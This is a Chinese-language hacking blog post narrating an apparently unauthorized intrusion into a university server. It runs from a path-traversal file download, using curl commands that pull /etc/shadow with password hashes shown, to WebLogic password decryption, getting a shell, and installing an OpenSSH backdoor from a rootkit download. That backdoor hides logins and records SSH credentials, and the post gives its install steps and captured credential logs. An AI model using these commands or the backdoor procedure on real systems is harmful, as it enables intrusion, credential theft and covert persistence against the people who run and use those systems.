---
layout: post
title: "从任意文件下载到系统 root 权限"
description: "Hacking"
headline: 
modified: 2015-10-21
category: Hacking
tags: [Hacking]
imagefeature: 
mathjax: 
chart: 
author: Ricter
comments: true
featured: true
---

* 目录
{:toc}

# 从任意文件下载到系统 root 权限


其实蛮没有技术含量。我在两年前遇到这个任意文件下载，却不知道该怎么做，到现在渗透经验足了，拿下了，然后记录一下这一个过程，就这样qwq。

## 0x01

目标站是学校内的一个某系统，存在一个 root 权限的任意文件下载漏洞。年轻的时候我用 AWVS 扫到，很开心。但是我只知道下载 `/etc/passwd` 和 `/etc/shadow`，然后去 cmd5 破解了个密码。

     owo &gt; ~ curl "http://xxxxx.cqupt.edu.cn/index.do?method=download&amp;fileName=../../../../../../../../../../../../../../../../../../etc/shadow" | grep "\$1"
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100  1450    0  1450    0     0   167k      0 --:--:-- --:--:-- --:--:--  177k
    root:$1$skHsra.H$231VnTWRAH5IZu/ZprShG1:15355:0:99999:7:::
    noc:$1$VfzOW6qf$5bFZHbF9kffKjWNNRRS.t1:15050:0:99999:7:::
    upload:$1$6l1DPvdr$9n35rMlJ.Y0K9T7LTTt4e.:15869:0:99999:7:::
    save:$1$MtVRP4E2$VR2c3KpZzxMXyrtbx5PKC1:15041:0:99999:7:::
    cisco:$1$imx62ClO$JoeFAGinKdzZFMZ1qmam20:15050:0:99999:7:::
    log:$1$G0ukagUJ$WGon1ynxgRMKxY1mY6HUa.:15105:0:99999:7:::
    `

    得到了 log 的密码是 log，save 的密码是 save。但是，可以破解密码都不能登录。

    ` owo &gt; ~ curl "http://xxxxx.cqupt.edu.cn/index.do?method=download&amp;fileName=../../../../../../../../../../../../../../../../../../etc/passwd" | grep bash
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100  2061    0  2061    0     0   228k      0 --:--:-- --:--:-- --:--:--  251k
    root:x:0:0:root:/root:/bin/bash
    weblogic:x:501:501::/home/weblogic:/bin/bash
    cisco:x:504:504::/home/cisco:/bin/bash
    `

    当时只到这里，啊，不知道怎么做了，GG，该干嘛干嘛。还是太年轻qwq。

    其实还有很多东西可以下载，比如 `/root/.bash_history`，看了一遍，拿到了 Web 目录：`/home/web/jsp/bea/user_projects/domains/xxx`。

    这个站其实是 weblogic 搭建的，比较蛋碎的是，我又不知道 weblogic 的密码，也不知道存放密码的路径。 

#### 题外话

    其实如果经验足够的话，应该可以知道密钥和密码文件存放的路径。

    密钥路径：/home/web/jsp/bea/user_projects/domains/DOMAIN_NAME/security/SerializedSystemIni.dat 

    密码文件路径：/home/web/jsp/bea/user_projects/domains/DOMAIN_NAME/servers/APP_NAME/security/boot.properties

    其中大部分信息都在 .bash_history 得到了，不过我还是不知道在哪，真是残念。

#### 题外话结束

    但是我机智的用 nmap 扫了下端口，发现 FTP 是 vsftpd。vsftpd 这么 6666，没做 chroot 的情况下可以各种看目录，而且用系统帐号就能登陆上。虽然是 `/sbin/nologin/`，但是 vsftp 还是能用的。上去之后翻了下目录，找到了加密后的密码还有加密密码的密钥。

  ![](http://7d9lm5.com1.z0.glb.clouddn.com/from-arbitrarily-file-download-to-root/4.PNG) 

## 0x02

根据[http://drops.wooyun.org/tips/349](http://drops.wooyun.org/tips/349)，可以造怎么去破解密码。里面给出的密码破解的 java 脚本依赖 weblogic 的包，我并不想在本地安装 weblogic，于是去万能的 Github 找了下，找到这个程序：[https://github.com/NetSPI/WebLogicPasswordDecryptor](https://github.com/NetSPI/WebLogicPasswordDecryptor)

    用法如下： 

    ` owo &gt; git clone https://github.com/NetSPI/WebLogicPasswordDecryptor
    Cloning into 'WebLogicPasswordDecryptor'...
    remote: Counting objects: 31, done.
    remote: Total 31 (delta 0), reused 0 (delta 0), pack-reused 31
    Unpacking objects: 100% (31/31), done.
    Checking connectivity... done.
     owo &gt; tmp cd WebLogicPasswordDecryptor/
     owo &gt; WebLogicPasswordDecryptor git:(master) javac WebLogicPasswordDecryptor.java
    WebLogicPasswordDecryptor.java:2: 警告: BASE64Decoder是内部专用 API, 可能会在未来发行版中删除
    import sun.misc.BASE64Decoder;
                   ^
    WebLogicPasswordDecryptor.java:41: 警告: BASE64Decoder是内部专用 API, 可能会在未来发行版中删除
            byte[] encryptedPassword1 = new BASE64Decoder().decodeBuffer(ciphertext);
                                            ^
    WebLogicPasswordDecryptor.java:95: 警告: BASE64Decoder是内部专用 API, 可能会在未来发行版中删除
            byte[] encryptedPassword1 = new BASE64Decoder().decodeBuffer(ciphertext);
                                            ^
    3 个警告
     pwq &gt; WebLogicPasswordDecryptor git:(master) ? java WebLogicPasswordDecryptor /tmp/SerializedSystemIni.dat "{3DES}0/rNaowFnaz32NHhiOKRmg=="
    DCaW2uXXX
     owo &gt; WebLogicPasswordDecryptor git:(master) ?
    `

    话说如果编译的时候发现缺少什么依赖包，可以去万能的 Google 搞定，我就不提了。 

    既然密码破解出来了，那就去 getshell 吧。

   ![](http://7d9lm5.com1.z0.glb.clouddn.com/from-arbitrarily-file-download-to-root/2.PNG)

   ![](http://7d9lm5.com1.z0.glb.clouddn.com/from-arbitrarily-file-download-to-root/1.PNG)

## 0x03

    拿到之后，并不知道密码，心里很纠结。

    因为这里的 cisco 账号也在某 mail.cqupt.edu.cn 中出现了，所以，我感觉还是要上一个比较牛逼的 backdoor。 

   问了我猫总之后，猫总推荐了我一个 openssh 的 backdoor。地址在这：[http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz](http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz) 

    首先 wget 下来，然后看一下 README 和 INSTALL。

    `[root@xxx openssh-5.9p1.patch]# ls
    INSTALL  LICENSE  openssh-5.9p1  openssh-5.9p1.tar.gz  README  sshbd5.9p1.diff  ssh_integrity_checker.sh
    [root@oa openssh-5.9p1.patch]# cat README
    Read LICENSE before redistributing
    Read INSTALL to install backdoor
    ssh_integrity_checker is tool for sysadmin to check possible OpenSSH infection

    FEATURES:
    - Isn't logged in lastlog, wtmp, utmp
    - Your IP isn't logged in /var/log/message and /var/log/secure (RHEL/CentOS)
    - Your IP isn't logged in /var/log/syslog and /var/log/auth.log (Ubuntu/Debian)
    - Record incoming/outgoing user and password for SSH login
    - Instant root access and bypass PermitRootLogin on sshd_config
    - Also support for SSH with pam enabled
    [root@oa openssh-5.9p1.patch]# cat INSTALL

    -- QUICKSTART

    wget http://mirror.corbina.net/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz
    tar zxvf openssh-5.9p1.tar.gz
    cp sshbd5.5p1.diff openssh-5.9p1/
    cd openssh-5.9p1
    patch &lt; sshbd5.9p1.diff

    modify version.h
    modify secret password and log path on includes.h
    make sure you already install zlib, openssl, kerberos5, and libpam development header file

    ./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
    make &amp;&amp; make install &amp;&amp; service ssh restart (debian/ubuntu)
    make &amp;&amp; make install &amp;&amp; service sshd restart (redhat/centos)
    [root@xxx openssh-5.9p1.patch]#
    `

    根据提示要安装一下 zlib-devel、openssl-devel、pam-devel、krb5-lib 之类的包。

    接着下载 openssh-5.9p1 的源代码，patch 掉，然后修改 `includes.h`，在 `includes.h` 的最下面。

   ![](http://7d9lm5.com1.z0.glb.clouddn.com/from-arbitrarily-file-download-to-root/3.PNG) 

    接着 `./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5`，然后 `make &amp;&amp; make install`。 

    重启 sshd 服务后，可以记录账号密码了。ssh 进来的在 `/tmp/ilog`，ssh 出去的在 `/tmp/olog`。

    `[root@xxx tmp]# cat ilog
    user:password --&gt; log:log
    user:password --&gt; log:log
    user:password --&gt; log:log
    [root@oa tmp]# cat olog
    user:password@host --&gt; root:asd@localhost
    [root@xxx tmp]#

接下来就是慢慢的等待了。